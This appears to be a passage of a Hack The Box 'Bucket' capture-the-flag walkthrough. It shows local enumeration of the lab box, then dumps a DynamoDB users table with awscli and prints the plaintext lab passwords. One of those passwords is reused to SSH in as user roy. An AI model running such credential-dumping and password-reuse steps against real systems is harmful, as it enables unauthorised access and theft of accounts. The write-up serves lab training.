# >> Enumeration -

- ### Interesting file permission on bucket-app -

`bucket-app` is owned by root, but there’s a plus at the end of the permissions string. That means it has extended permissions, or ACLs:


```bash
www-data@bucket:/var/www$ ls -la
total 16
drwxr-xr-x   4 root root 4096 Feb 10 12:29 .
drwxr-xr-x  14 root root 4096 Feb 10 12:29 ..
drwxr-x---+  4 root root 4096 Feb 10 12:29 bucket-app
drwxr-xr-x   2 root root 4096 May  6 22:53 html
```

```bash
www-data@bucket:/var/www$ getfacl bucket-app/
# file: bucket-app/
# owner: root
# group: root
user::rwx
user:roy:r-x
group::r-x
mask::r-x
other::---
```

roy has access to this directory to read and execute.

- ### Exploring /home directory-

```bash
www-data@bucket:/home/roy$ ls -la
total 28
drwxr-xr-x 3 roy  roy  4096 Sep 24  2020 .
drwxr-xr-x 3 root root 4096 Sep 16  2020 ..
lrwxrwxrwx 1 roy  roy     9 Sep 16  2020 .bash_history -> /dev/null
-rw-r--r-- 1 roy  roy   220 Sep 16  2020 .bash_logout
-rw-r--r-- 1 roy  roy  3771 Sep 16  2020 .bashrc
-rw-r--r-- 1 roy  roy   807 Sep 16  2020 .profile
drwxr-xr-x 3 roy  roy  4096 Sep 24  2020 project
-r-------- 1 roy  roy    33 May  6 21:15 user.txt
```

```bash
www-data@bucket:/home/roy/project$ ls -la
total 44
drwxr-xr-x  3 roy roy  4096 Sep 24  2020 .
drwxr-xr-x  3 roy roy  4096 Sep 24  2020 ..
-rw-rw-r--  1 roy roy    63 Sep 24  2020 composer.json
-rw-rw-r--  1 roy roy 20533 Sep 24  2020 composer.lock
-rw-r--r--  1 roy roy   367 Sep 24  2020 db.php
drwxrwxr-x 10 roy roy  4096 Sep 24  2020 vendor
```

- ### `db.php` contains connection information to [DynamoDB](https://aws.amazon.com/dynamodb/), which is AWS’ NoSQL database instance.

- ### Checking connections on the box-

```bash
www-data@bucket:/home/roy/project$ ss -lnpt
State             Recv-Q            Send-Q                        Local Address:Port                          Peer Address:Port            Process            
LISTEN            0                 4096                          127.0.0.53%lo:53                                 0.0.0.0:*                                  
LISTEN            0                 4096                              127.0.0.1:4566                               0.0.0.0:*                                  
LISTEN            0                 128                                 0.0.0.0:22                                 0.0.0.0:*                                  
LISTEN            0                 511                               127.0.0.1:8000                               0.0.0.0:*                                  
LISTEN            0                 4096                              127.0.0.1:46093                              0.0.0.0:*                                  
LISTEN            0                 128                                    [::]:22                                    [::]:*                                  
LISTEN            0                 511                                       *:80                                       *:*                                  
```

- ### Apache Virtual Hosts -

```bash
www-data@bucket:/home/roy/project$ cd /etc/apache2/sites-enabled/
www-data@bucket:/etc/apache2/sites-enabled$ ls
000-default.conf
```
- Port 8000 running as root -
```bash
<VirtualHost 127.0.0.1:8000>
        <IfModule mpm_itk_module>
                AssignUserId root root
        </IfModule>
        DocumentRoot /var/www/bucket-app
</VirtualHost>
```

###  >> Enumerating DynamoDB through awscli-

- Enumearting tables -


```bash
root@napster:~/Documents/HTB/Bucket# aws --endpoint-url http://s3.bucket.htb dynamodb list-tables
{
    "TableNames": [
        "users"
    ]
}
```

-  The `scan` subcommand seems like the one to use to dump an entire table -

```bash
root@napster:~/Documents/HTB/Bucket# aws --endpoint-url http://s3.bucket.htb dynamodb scan --table-name users
{
    "Items": [
        {
            "password": {
                "S": "Management@#1@#"
            },
            "username": {
                "S": "Mgmt"
            }
        },
        {
            "password": {
                "S": "Welcome123!"
            },
            "username": {
                "S": "Cloudadm"
            }
        },
        {
            "password": {
                "S": "n2vM-<_K_Q:.Aa2"
            },
            "username": {
                "S": "Sysadm"
            }
        }
    ],
    "Count": 3,
    "ScannedCount": 3,
    "ConsumedCapacity": null
}
```

- ### Usernames -

```bash
root@napster:~/Documents/HTB/Bucket# aws --endpoint-url http://s3.bucket.htb dynamodb scan --table-name users | jq  .Items[].username[]
"Mgmt"
"Cloudadm"
"Sysadm"
```

- ### Passwords -

```bash
root@napster:~/Documents/HTB/Bucket# aws --endpoint-url http://s3.bucket.htb dynamodb scan --table-name users | jq  .Items[].password[]
"Management@#1@#"
"Welcome123!"
"n2vM-<_K_Q:.Aa2"
```

## >>Trying to use the above pasword with user roy and log in via su/ssh -

- ### ssh roy@10.10.10.212						[Password -  n2vM-<_K_Q:.Aa2]

![[Pasted image 20210506195940.png]]